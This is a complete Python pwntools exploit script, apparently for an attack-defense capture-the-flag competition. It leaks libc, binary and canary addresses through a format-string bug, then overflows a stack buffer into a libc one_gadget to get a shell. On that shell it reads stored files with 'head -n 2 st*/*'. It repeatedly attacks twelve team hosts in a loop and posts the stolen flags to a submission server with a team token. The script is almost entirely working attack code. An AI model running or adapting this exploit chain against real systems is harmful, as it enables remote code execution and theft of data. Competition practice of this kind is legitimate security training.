#!/usr/bin/env python3
from pwn import *
from hashlib import sha1
import time
import sys
import requests

# =========================================================
#                          SETUP                         
# =========================================================
exe = './source_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '10.80.7.2', 50001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# breakrva 0x18f0

breakrva 0x24bc
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit(ip=None):
    global io
    io = remote(ip, port, timeout=5)

    r = sha1(str(time.time()).encode()).digest().hex()

    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', r[:4].encode())
    io.sendlineafter(b':', r[:4].encode())
    io.sendlineafter(b':', b'%19$p|%43$p|%41$p|')

    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', r[:4].encode())
    io.sendlineafter(b':', r[:4].encode())
    io.recvuntil(b'Login successful')

    io.sendlineafter(b':', b'7')
    io.recvuntil(b'Description:')

    libc.address = int(io.recvuntil(b'|')[:-1], 16) - 0x21b780
    elf.address = int(io.recvuntil(b'|')[:-1], 16) - 0x2423
    canary = int(io.recvuntil(b'|')[:-1], 16) 

    rop = ROP(libc)

    io.sendlineafter(b':', b'8')
    one_gadget = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]
    payload = b'\x00' * 104 + p64(canary) + p64(elf.bss()+0x712) + p64(rop.rsi.address) + p64(0x0) + p64(libc.address + one_gadget[2])
    io.sendlineafter(b'~', payload)

    io.sendlineafter(b':', b'0')

    io.sendline(f'head -n 2 st*/*'.encode())
    io.sendline(f'echo {r}'.encode())

    flags = []
    try:
        tmp = io.recvuntil(r.encode()).split(b'\n')
        for leak in tmp: 
            if b'Description:' in leak:
                flags.append(leak[13:].strip())
    except Exception:
        pass

    log.info("libc base: %#x", libc.address)
    log.info("elf base: %#x", elf.address)
    log.info("canary: %#x", canary)
    io.close()
    
    actual = []
    print("FLAGS: ", flags, flush=True)
    for i in range(len(flags)):
        if len(flags[i]) == 32:
            actual.append(flags[i])
    print("FLAGS: ", actual, flush=True)
    
    response = requests.put(
            'http://10.10.10.10/flags/',
            json=actual,
            headers={
                'X-Team-Token': 'd480aedb8924c64f',
            })
    print(response.text)
    io.close()
    
if __name__ == '__main__':
    while(True):
        for ip in range(1, 12+1):
            host = f'10.80.{ip}.2'
            try:
                exploit(host)
            except Exception as e:
                print(e)
        log.info("SLEEPING FOR 5s")
        sleep(5)
